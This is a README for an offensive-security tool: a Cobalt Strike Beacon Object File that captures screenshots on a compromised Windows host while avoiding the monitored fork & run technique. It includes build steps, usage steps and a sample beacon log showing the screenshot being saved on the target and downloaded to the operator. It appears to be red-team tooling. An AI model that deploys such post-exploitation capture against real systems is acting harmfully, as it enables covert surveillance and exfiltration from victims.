# ScreenshotBOF

An alternative screenshot capability for Cobalt Strike that uses WinAPI and does not perform a fork & run. Screenshot saved to disk as a file.

## Self Compilation
1. git clone the repo
2. open the solution in Visual Studio
3. Build project BOF

## Usage
1. import the screenshotBOF.cna script into Cobalt Strike
2. use the command screenshot_bof
3. Download the screenshot from the target
```
beacon> screenshot_bof
[*] Running screenshot BOF by (@codex_tf2)
[+] host called home, sent: 3411 bytes
[+] received output:
[*] Tasked beacon to printscreen and save to disk
[+] received output:
[+] PrintScreen saved to bitmap...
[+] received output:
[+] Printscreen bitmap saved to screenshot.bmp
beacon> download screenshot.bmp
[*] Tasked beacon to download screenshot.bmp
[+] host called home, sent: 22 bytes
[*] started download of C:\screenshot.bmp (12441668 bytes)
[*] download of screenshot.bmp is complete
```

## Notes
- no evasion is performed, which should be fine since the WinAPIs used are not malicious
- in memory downloading of screenshots is planned to be added
- the filename can be changed in the source code.

## Why did I make this?
Cobalt Strike uses a technique known as fork & run for many of its post-ex capabilities, including the screenshot command. While this behaviour provides stability, it is now well known and heavily monitored for. This BOF is meant to provide a more OPSEC safe version of the screenshot capability.

## Credits
- Made using https://github.com/securifybv/Visual-Studio-BOF-template
- Save BMP to file from https://stackoverflow.com/a/60667564